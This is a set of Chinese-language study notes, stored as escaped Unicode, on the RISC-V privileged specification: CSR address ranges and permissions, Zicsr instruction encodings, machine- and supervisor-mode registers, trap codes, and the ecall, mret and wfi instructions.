\u8868\u793a\u53ef\u4ee5\u8bbf\u95ee\u8be5\u5bc4\u5b58\u5668\u7684\u6700\u4f4e\u7279\u6743\u7ea7\u3002\u76f8\u5173\u6743\u9650\u4e00\u822c\u8868\u793a\u4e3a\u4e09\u4f4d\u5b57\u6bcd\uff0c\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u8868\u793a\u6700\u4f4e\u7279\u6743\u7ea7\uff0c\u540e\u4e24\u4e2a\u5b57\u6bcd\u8868\u793a\u8bfb\u5199\u6743\u9650\uff08RW/RO\uff09\u3002 \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684 CSR \u4f1a\u5bfc\u81f4 illegal instruction exception\uff0c\u8bbf\u95ee\u66f4\u9ad8\u7ea7\u7684 CSR\u3001\u6216\u8005\u5199\u5165\u53ea\u8bfb CSR \u4e5f\u4f1a\u5bfc\u81f4\u8be5\u5f02\u5e38\u3002\u4e00\u4e2a\u53ef\u8bfb\u53ef\u5199\u7684\u5bc4\u5b58\u5668\u4e5f\u53ef\u80fd\u4f1a\u6709\u53ea\u8bfb\u7684\u4f4d\uff0c\u4f46\u8fd9\u65f6\u5199\u5165\u53ea\u8bfb\u4f4d\u4f1a\u88ab\u5ffd\u7565\uff08\u800c\u4e0d\u4f1a\u5bfc\u81f4\u5f02\u5e38\uff09\u3002 CSR \u8fd8\u5206\u6709\u6807\u51c6\u548c\u975e\u6807\u51c6\u4e24\u7c7b\uff08Standard/Custom\uff09\uff0c\u5176\u4e2d Custom CSR \u5728\u672a\u6765\u6807\u51c6\u4e2d\u4e5f\u4e0d\u4f1a\u88ab\u5360\u7528\u3002\u5b83\u4eec\u662f\uff1a 0x800~0x8FF (1000 xxxx) URW\u30010xCC0~0xCFF (1100 11xx) URO 0x5C0~0x5FF (0101 11xx) SRW\u30010x9C0~0x9FF (1001 11xx) SRW\u30010xDC0~0xDFF (1101 11xx) SRO 0x6C0-0x6FF (0110 11xx) HRW\u30010xAC0-0xAFF (1010 11xx) HRW\u30010xEC0-0xEFF (1110 11xx) HRO 0x7C0-0x7FF (0111 11xx) MRW\u30010xBC0-0xBFF (1011 11xx) MRW\u30010xFC0-0xFFF (1111 11xx) MRO \u9488\u5bf9 D \u6a21\u5f0f\u6709\u4e00\u4e9b\u4fdd\u7559\u7684 CSR\uff0c0x7A0~0x7AF \u662f M \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\uff0c0x7B0~0x7BF \u662f\u53ea\u6709 D \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\u3002 CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09 \u00b6 Zicsr \u6269\u5c55\u4e2d\u89c4\u5b9a\u4e86\u4e00\u7cfb\u5217\u5173\u4e8e\u8bbf\u95ee CSR \u7684\u6307\u4ee4\uff0c\u4f7f\u7528\u7279\u6743\u7ea7\u7684\u8bdd\u4e00\u5b9a\u8981\u5b9e\u73b0\u8be5\u6269\u5c55\u3002 CSR \u6307\u4ee4\u90fd\u4f7f\u7528 I \u578b\u6307\u4ee4\uff0c\u5176\u4e2d 12 \u4f4d\u7684\u7acb\u5373\u6570\u90e8\u5206\u8868\u793a CSR \u7684\u5730\u5740\uff0cfunct3 \u4f4e 2 \u4f4d\u7528\u6765\u7f16\u7801\u8bfb/\u6539/\u5199\uff08read-modify-write\uff09\u64cd\u4f5c\u3001\u9ad8 1 \u4f4d\u8868\u793a\u662f\u5426\u6765\u81ea\u7acb\u5373\u6570\uff08\u5982\u679c\u6765\u81ea\u7acb\u5373\u6570\u5219 rs1 \u90e8\u5206\u8868\u793a\u4e00\u4e2a 5 \u4f4d\u65e0\u7b26\u53f7\u7acb\u5373\u6570\uff09\uff0copcode \u90fd\u662f SYSTEM\uff081110011\uff09\u3002 csrrw I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 001 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrw rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u503c\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr\uff08\u4e5f\u4e0d\u4f1a\u9020\u6210\u4efb\u4f55\u8bfb\u7684\u526f\u4f5c\u7528\uff09 csrrs I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 010 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrs rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 rs1 \u503c\u4e0e csr \u8fdb\u884c\u6309\u4f4d\u6216\u8fd0\u7b97\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrc I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 011 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrc rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u4e2d\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0 \u6ce8\u610f \uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrwi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 101 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrwi rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr csrrsi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 110 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrs rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrci I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 111 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrc rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0 \u6ce8\u610f \uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d \u6c47\u7f16\u4f2a\u4ee3\u7801 \u00b6 \u4e00\u4e9b\u53ea\u8bfb/\u53ea\u5199\u7684\u6c47\u7f16\u7b80\u5316\u5199\u6cd5\uff1a \u4f2a\u4ee3\u7801 \u539f\u6307\u4ee4 csrr rd, csr csrrs rd, csr, x0 csrw csr, rs1 csrrw x0, csr, rs1 csrwi csr, uimm csrrwi x0, csr, uimm csrs csr, rs1 csrrs x0, csr, rs1 csrsi csr, uimm csrrsi x0, csr, uimm csrc csr, rs1 csrrc x0, csr, rs1 csrci csr, uimm csrrci x0, csr, uimm \u5df2\u5206\u914d\u7684 CSR \u00b6 Hypervisor/Debug \u6a21\u5f0f\u7565\u8fc7\u4e86\u3002 \u975e\u7279\u6743\u7ea7 / User \u6a21\u5f0f \u00b6 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x001 URW fflags \u6d6e\u70b9\u5f02\u5e38\u6807\u5fd7 0x002 URW frm \u6d6e\u70b9\u820d\u5165\u6a21\u5f0f 0x003 URW fcsr \u6d6e\u70b9\u63a7\u5236\u5bc4\u5b58\u5668 0xC00 URO cycle \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\uff08rdcycle \u6307\u4ee4\u8bfb\u53d6\uff09 0xC01 URO time \u8ba1\u65f6\u5668\uff08rdtime \u6307\u4ee4\u8bfb\u53d6\uff09 0xC02 URO instret \u6307\u4ee4\u8ba1\u6570\u5668\uff08rdinstret \u6307\u4ee4\u8bfb\u53d6\uff09 0xC03-0xC1F URO hpmcounter3-31 \u6027\u80fd\u8ba1\u6570\u5668 0xC80 URO cycleh \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC81 URO timeh \u8ba1\u65f6\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC82 URO instreth \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC83-0xC9F URO hpmcounter3h-31h \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Supervisor \u6a21\u5f0f \u00b6 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x100 SRW sstatus Supervisor \u72b6\u6001\u5bc4\u5b58\u5668 0x104 SRW sie Supervisor \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x105 SRW stvec Supervisor \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x106 SRW scounteren Supervisor \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x10A SRW senvcfg Supervisor \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x140 SRW sscratch Supervisor trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x141 SRW sepc Supervisor exception pc \u5bc4\u5b58\u5668 0x142 SRW scause Supervisor trap \u539f\u56e0\u5bc4\u5b58\u5668 0x143 SRW stval Supervisor trap \u503c\u5bc4\u5b58\u5668 0x144 SRW sip Supervisor \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x180 SRW satp Supervisor \u5730\u5740\u7ffb\u8bd1\u5bc4\u5b58\u5668 0x5A8 SRW scontext Supervisor \u6a21\u5f0f\u4e0a\u4e0b\u6587\u5bc4\u5b58\u5668 Machine \u6a21\u5f0f \u00b6 Machine \u4fe1\u606f\u5bc4\u5b58\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xF11 MRO mvendorid Machine \u5382\u5546 ID 0xF12 MRO marchid Machine \u67b6\u6784 ID 0xF13 MRO mimpid Machine \u5b9e\u73b0 ID 0xF14 MRO mhartid Machine hart ID 0xF15 MRO mconfigptr Machine \u914d\u7f6e\u6570\u636e\u7ed3\u6784\u4f53\u6307\u9488 Machine trap \u8bbe\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x300 MRW mstatus Machine \u72b6\u6001\u5bc4\u5b58\u5668 0x301 MRW misa Machine ISA \u4e0e\u6269\u5c55\u5bc4\u5b58\u5668 0x302 MRW medeleg Machine \u5f02\u5e38\u59d4\u6258\u5bc4\u5b58\u5668 0x303 MRW mideleg Machine \u4e2d\u65ad\u59d4\u6258\u5bc4\u5b58\u5668 0x304 MRW mie Machine \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x305 MRW mtvec Machine \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x306 MRW mcounteren Machine \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x310 MRW mstatush Machine \u72b6\u6001\u5bc4\u5b58\u5668\u9644\u52a0\u90e8\u5206\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine trap \u5904\u7406\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x340 MRW mscratch Machine trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x341 MRW mepc Machine exception pc \u5bc4\u5b58\u5668 0x342 MRW mcause Machine trap \u539f\u56e0\u5bc4\u5b58\u5668 0x343 MRW mtval Machine trap \u503c\u5bc4\u5b58\u5668 0x344 MRW mip Machine \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x34A MRW mtinst Machine trap \u6307\u4ee4\u5bc4\u5b58\u5668 0x34B MRW mtval2 Machine trap \u503c\u5bc4\u5b58\u5668 Machine \u914d\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x30A MRW menvcfg Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x31A MRW menvcfgh Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0x747 MRW mseccfg Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668 0x757 MRW mseccfgh Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u5185\u5b58\u4fdd\u62a4\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x3A0-0x3AF MRW pmpcfg0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u914d\u7f6e\u5bc4\u5b58\u5668\uff08\u5947\u6570\u53ea\u6709 RV32 \u6709\uff09 0x3B0-0x3BF MRW pmpaddr0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u5730\u5740\u5bc4\u5b58\u5668 Machine \u8ba1\u6570/\u8ba1\u65f6\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xB00 MRW mcycle Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668 0xB02 MRW minstret Machine \u6307\u4ee4\u8ba1\u6570\u5668 0xB03-0xB1F MRW mhpmcounter3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668 0xB80 MRW mcycleh Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB82 MRW minstreth Machine \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB83-0xB9F MRW mhpmcounter3h-31h Machine \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u8ba1\u6570\u5668\u8bbe\u7f6e \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x320 MRW mcounterinhibit Machine \u6027\u80fd\u8ba1\u6570\u5668\u7981\u6b62\u5bc4\u5b58\u5668 0x323-0x33F MRW mhpmevent3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668\u4e8b\u4ef6\u9009\u62e9\u5bc4\u5b58\u5668 CSR \u5b57\u6bb5\u7f29\u5199\u89c4\u8303 \u00b6 \u540e\u9762\u5728\u5b9a\u4e49\u5404\u4e2a CSR \u5b57\u6bb5\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u4e00\u4e9b\u7f29\u5199\uff1a WPRI \uff08reserved Writes Preserve values, Reads Ignore values\uff09\uff1a\u5199\u4fdd\u7559\uff0c\u8bfb\u5ffd\u7565 WLRL \uff08Write/Read Only Legal values\uff09\uff1a\u53ea\u80fd\u5199/\u8bfb\u5408\u6cd5\u503c\uff08\u4e0d\u5408\u6cd5\u7684\u65f6\u5019\u63a8\u8350\u4f46\u4e0d\u5fc5\u987b\u629b\u51fa\u5f02\u5e38\uff09 WARL \uff08Write Any values, Read Legal values\uff09\uff1a\u5199\u4efb\u610f\u503c\uff0c\u8bfb\u5408\u6cd5\u503c Machine \u6a21\u5f0f \u00b6 M \u6a21\u5f0f CSRs \u00b6 \u53ea\u5199\u4e00\u4e9b\u91cd\u8981\u3001\u6709\u7528\u7684\u3002 .csr-bit { background-color: #3f6ec6b0; border-radius: 3px; font-size: .4rem; padding: 4px; } .csr-behav { background-color: #e6695bb0; border-radius: 3px; font-size: .4rem; padding: 4px; } misa \u00b6 [31:30] / [63:62] WARL MXL\uff1a\u7f16\u7801 XLEN\uff0c1 \u8868\u793a RV32\uff0c2 \u8868\u793a RV64\uff0c3 \u8868\u793a RV128 [25:0] WARL Extensions\uff1a\u6269\u5c55\uff0c\u4ece 0 \u4f4d\u5230 25 \u4f4d\u4f9d\u6b21\u8868\u793a A-Z \u6269\u5c55\uff0c0 \u8868\u793a\u4e0d\u5b58\u5728\uff0c1 \u8868\u793a\u5b58\u5728 mstatus \u00b6 \u4ec5\u4ec5\u662f\u4e00\u90e8\u5206\u4e2d\u65ad\u5904\u7406\u65f6\u4f1a\u7528\u5230\u7684\u5b57\u6bb5\uff1a 1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 3 MIE\uff1aM \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 7 MPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a M \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b [12:11] WARL MPP\uff1aM \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b 22 WARL TSR\uff1a\u4e3a 1 \u65f6\u7981\u6b62 S \u6a21\u5f0f\u4e0b\u6267\u884c sret\uff0c\u4e3a 0 \u65f6\u5141\u8bb8\uff0c\u6ca1\u6709 S \u6a21\u5f0f\u65f6\u4e3a\u53ea\u8bfb 0 mtvec \u00b6 \u7528\u4e8e\u4fdd\u5b58 Machine \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740 [31:2] / [63:2] WARL Base\uff1a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff084 \u5b57\u8282\u5bf9\u9f50\uff09 [1:0] WARL Mode\uff1a\u6a21\u5f0f\uff0c\u5206\u4e3a\u4ee5\u4e0b\u4e24\u79cd\uff1a 0 - Direct\uff1a\u76f4\u63a5\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base 1 - Vectored\uff1a\u5411\u91cf\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base + 4 * cause\uff08cause \u5728\u4e0b\u9762\u6709\u5b9a\u4e49\uff09 medeleg & mideleg \u00b6 \u7edf\u79f0 machine trap delegation registers\uff0cmideleg\uff08machind interrupt delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u4e2d\u65ad\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002medeleg\uff08machine exception delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u5f02\u5e38\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002 \u4e2d\u65ad\u7801\uff1a 1: Supervisor Software Interrupt 3: Machine Software Interrupt 5: Supervisor Timer Interrupt 7: Machine Timer Interrupt 9: Supervisor External Interrupt 11: Machine External Interrupt \u5f02\u5e38\u7801\uff1a 0: Instruction Address Misaligned 1: Instruction Access Fault 2: Illegal Instruction 3: Breakpoint 4: Load Address Misaligned 5: Load Access Fault 6: Store/AMO Address Misaligned 7: Store/AMO Access Fault 8: Environment Call from U-mode 9: Environment Call from S-mode 11: Environment Call from M-mode 12: Instruction Page Fault 13: Load Page Fault 15: Store/AMO Page Fault \u9700\u8981\u59d4\u6258\u54ea\u4e9b\u4e2d\u65ad/\u5f02\u5e38\uff0c\u5c31\u5c06\u5bf9\u5e94\u5bc4\u5b58\u5668\u7684\u5bf9\u5e94\u4f4d\u8bbe\u7f6e\u4e3a 1\uff0c\u4e0d\u9700\u8981\u59d4\u6258\u5c31\u8bbe\u7f6e\u4e3a 0\u3002 mip & mie \u00b6 \u5206\u522b\u662f machine interrupt pending \u548c machine interrupt enable\uff0c\u7528\u4e8e\u4fdd\u5b58\u4e2d\u65ad\u662f\u5426\u53d1\u751f\u4ee5\u53ca\u662f\u5426\u5141\u8bb8\u4e2d\u65ad\u3002 \u4e2d\u65ad i\uff08\u4e0a\u9762\u5b9a\u4e49\u7684\u4e2d\u65ad\u7801\uff09\u9677\u5165 M \u6a21\u5f0f\u5f53\u4ee5\u4e0b\u6761\u4ef6\u540c\u65f6\u6ee1\u8db3\u65f6\uff1a \u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4e3a M \u6a21\u5f0f\uff0c\u4e14 mstatus[MIE] \u4e3a 1\uff0c\u6216\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4f4e\u4e8e M mip[i] \u4e3a 1\uff0c\u4e14 mie[i] \u4e3a 1 \u5982\u679c\u5b58\u5728 mideleg \u5bc4\u5b58\u5668\uff0c\u5219\u9700\u8981 mideleg[i] \u4e3a 0\uff08\u4e0d\u59d4\u6258\uff09 mepc & mcause \u00b6 mepc \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u6307\u4ee4\u5730\u5740\u3002 mcause \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u7684\u539f\u56e0\uff08\u4e0a\u9762\u89c4\u5b9a\uff09\uff1a 31 / 63 Interrupt\uff1a\u4e3a 1 \u65f6\u8868\u793a\u662f\u4e2d\u65ad\uff0c\u4e3a 0 \u65f6\u8868\u793a\u662f\u5f02\u5e38 [30:0] / [62:0] WLRL Code\uff1a\u4e2d\u65ad/\u5f02\u5e38\u7801\uff08\u4ee5\u503c\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u800c\u4e0d\u662f\u5bf9\u5e94\u4f4d\uff09 mtval \u00b6 \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u9644\u52a0\u4fe1\u606f\uff1a \u5982\u679c\u662f\u7531\u5b58\u50a8\u5668\u8bbf\u95ee\u5f15\u8d77\u7684\u5f02\u5e38\uff0c\u5219 mtval \u4fdd\u5b58\u7684\u662f\u8981\u8bbf\u95ee\u7684\u5730\u5740 \u5982\u679c\u662f\u975e\u6cd5\u6307\u4ee4\u9020\u6210\u7684\u5f02\u5e38\uff0c\u5219\u5c06\u8be5\u6307\u4ee4\u7684\u7f16\u7801\u4fdd\u5b58\u5728 mtval \u4e2d M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668 \u00b6 RISC-V \u7279\u6743\u7ea7\u89c4\u8303\u89c4\u5b9a\u4e86\u4e24\u4e2a M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668\uff0c\u5206\u522b\u662f mtime \u548c mtimecmp\u3002 mtime \u548c mtimecmp \u5728 RV32 \u548c RV64 \u4e2d\u90fd\u662f 64 \u4f4d\u7684\u3002mtime \u5e94\u8be5\u7531\u673a\u5668\u5b9e\u73b0\uff0c\u4ee5\u56fa\u5b9a\u9891\u7387\u9012\u589e\u3002\u5f53 mtime \u7684\u503c\u5927\u4e8e\u7b49\u4e8e mtimecmp \u65f6\uff0c\u8981\u89e6\u53d1 machine timer interrupt\uff08\u5f53 mie \u5bc4\u5b58\u5668\u4e2d\u7684 MTIE \u4f4d\u4e3a 1 \u65f6\uff09\u3002 Note \u5728 qemu \u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e2d\uff0cmtime \u7684\u5730\u5740\u4f4d\u4e8e 0x200bff8\uff0cmtimecmp \u7684\u5730\u5740\u4f4d\u4e8e 0x2004000\u3002 M \u6a21\u5f0f\u7279\u6743\u6307\u4ee4 \u00b6 ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1aM \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-M-mode \u5f02\u5e38 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ecall \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ebreak \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c mret I \u578b 31 20 19 15 14 12 11 7 6 0 001100000010 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1amret \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 M \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u5c06 mstatus[MIE] \u8bbe\u7f6e\u4e3a mstatus[MPIE] \u5c06 mstatus[MPIE] \u8bbe\u7f6e\u4e3a 1 \u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1awfi \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop Supervisor \u6a21\u5f0f \u00b6 S \u6a21\u5f0f CSRs \u00b6 sstatus \u00b6 sstatus \u662f mstatus \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u7528\u4e8e\u4fdd\u5b58 S \u6a21\u5f0f\u7684\u72b6\u6001\uff0c\u5176\u90e8\u5206\u4e2d\u65ad\u76f8\u5173\u7684\u7ed3\u6784\u5982\u4e0b\uff1a 1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b \u5176\u5b83 \u00b6 